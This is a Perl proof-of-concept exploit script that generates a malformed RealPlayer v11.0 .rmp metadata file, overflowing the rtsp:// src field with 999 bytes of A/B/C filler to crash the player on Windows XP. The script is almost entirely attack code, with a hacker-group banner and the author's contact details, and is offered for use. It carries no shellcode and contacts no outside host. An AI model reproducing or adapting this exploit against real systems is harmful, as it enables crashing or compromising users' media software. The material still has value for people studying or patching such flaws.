#!/usr/bin/perl

###
# Title : RealPlayer v11.0 (.rmp) Buffer Overflow
# Author : KedAns-Dz
# E-mail : ked-h@hotmail.com
# Home : HMD/AM (30008/04300) - Algeria -(00213555248701)
# Twitter page : twitter.com/kedans
# platform : Windows 
# Impact : Buffer Overflow
# Tested on : Windows XP SP3 Fran.ais 
# Target : RealPlayer v11.0 
###
# Note : BAC 2011 Enchallah ( KedAns 'me' & BadR0 & Dr.Ride & Red1One & XoreR & Fox-Dz ... all )
# -----------------
# XML version : 1.0 in (Real Metadata Package File)
# <?xml version="1.0"?>
# <embed src="rtsp:// **BUFFER ** " autoplay="whatever" />Null
# -----------------
#START SYSTEM /root@MSdos/ :
# -----------------
system("title KedAns-Dz");
system("color 1e");
system("cls");
print "\n\n";                  
print "    |============================================================|\n";
print "    |= [!] Name : RealPlayer v11.0 Real Metadata Package File   =|\n";
print "    |= [!] Exploit : Buffer Overflow                            =|\n";
print "    |= [!] Author : KedAns-Dz                                   =|\n";
print "    |= [!] Mail: Ked-h(at)hotmail(dot)com                       =|\n";
print "    |============================================================|\n";
sleep(2);
print "\n";
# Parameter OverFlow => 
my $kA = "\x41" x 333 ; # A * 333
my $kB = "\x42" x 333 ; # B * 333
my $kC = "\x43" x 333 ; # C * 333
my $buffer = $kA.$kB.$kC ;
my $header = 
"\x3c\x3f\x78\x6d\x6c\x20\x76\x65\x72\x73\x69\x6f\x6e\x3d\x22\x31".
"\x2e\x30\x22\x3f\x3e\x0d\x0d\x3c\x65\x6d\x62\x65\x64\x20\x73\x72".
"\x63\x3d\x22\x72\x74\x73\x70\x3a\x2f\x2f".$buffer."\x22\x20\x61\x75\x74\x6f".
"\x70\x6c\x61\x79\x3d\x22\x77\x68\x61\x74\x65\x76\x65\x72\x22\x20".
"\x2f\x3e\x00";
# Creating ...
my $kedans = $header ; # |=:: Header & AAA...BBB...CC etc ::=| 
open (FILE ,"> Crash.rmp"); # Evil File Here
print FILE $kedans ;
print "\n [+] File successfully created!\n" or die print "\n [-] OpsS! File is Not Created !! ";
close (FILE);

